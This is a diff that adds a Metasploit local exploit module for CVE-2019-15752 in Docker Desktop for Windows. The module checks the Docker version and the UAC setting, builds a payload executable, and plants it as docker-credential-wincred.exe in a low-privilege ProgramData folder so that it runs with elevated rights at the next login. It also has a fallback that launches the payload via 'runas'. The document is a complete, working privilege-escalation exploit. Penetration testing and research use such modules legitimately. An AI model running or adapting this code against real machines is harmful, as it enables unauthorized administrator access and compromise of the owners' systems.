@@ -1,0 +1,108 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ManualRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Post::Windows::Priv
+  include Post::Windows::Runas
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Docker-Credential-Wincred.exe Privilege Escalation',
+        'Description' => %q{
+          This exploit leverages a vulnerability in docker desktop
+          community editions prior to 2.1.0.1 where an attacker can write
+          a payload to a lower-privileged area to be executed
+          automatically by the docker user at login.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Morgan Roman', # discovery
+          'bwatters-r7', # metasploit module
+        ],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Targets' => [[ 'Automatic', {} ]],
+        'DefaultTarget' => 0,
+        'DefaultOptions' => {
+          'WfsDelay' => 15
+        },
+        'DisclosureDate' => '2019-07-05',
+        'Notes' =>
+        {
+          'SideEffects' => [ ARTIFACTS_ON_DISK ]
+        },
+        'References' => [
+          ['CVE', '2019-15752'],
+          ['URL', 'https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e']
+        ]
+      )
+    )
+    register_options(
+      [OptString.new('PROGRAMDATA', [true, 'Path to docker version-bin.', '%PROGRAMDATA%'])]
+    )
+  end
+
+  def docker_version
+    output = cmd_exec('cmd.exe', '/c docker -v')
+    vprint_status(output)
+    version_string = output.match(/(\d+\.)(\d+\.)(\d)/)[0]
+    Gem::Version.new(version_string.split('.').map(&:to_i).join('.'))
+  end
+
+  def check
+    if docker_version <= Gem::Version.new('18.09.0')
+      return CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    check_permissions!
+    case get_uac_level
+    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
+      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
+      fail_with(Failure::NotVulnerable,
+                "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...")
+    when UAC_DEFAULT
+      print_good('UAC is set to Default')
+      print_good('BypassUAC can bypass this setting, continuing...')
+    when UAC_NO_PROMPT
+      print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
+      shell_execute_exe
+      return
+    end
+
+    # make payload
+    docker_path = expand_path("#{datastore['PROGRAMDATA']}\\DockerDesktop\\version-bin")
+    fail_with(Failure::NotFound, 'Vulnerable Docker path is not on system') unless directory?(docker_path)
+    payload_name = 'docker-credential-wincred.exe'
+    payload_pathname = "#{docker_path}\\#{payload_name}"
+    vprint_status('Making Payload')
+    payload = generate_payload_exe
+
+    # upload Payload
+    vprint_status("Uploading Payload to #{payload_pathname}")
+    write_file(payload_pathname, payload)
+    vprint_status('Payload Upload Complete')
+    print_status('Waiting for user to attempt to login')
+  end
+
+  def check_permissions!
+    unless check == Exploit::CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?
+    # Check if you are an admin
+    # is_in_admin_group can be nil, true, or false
+  end
+end
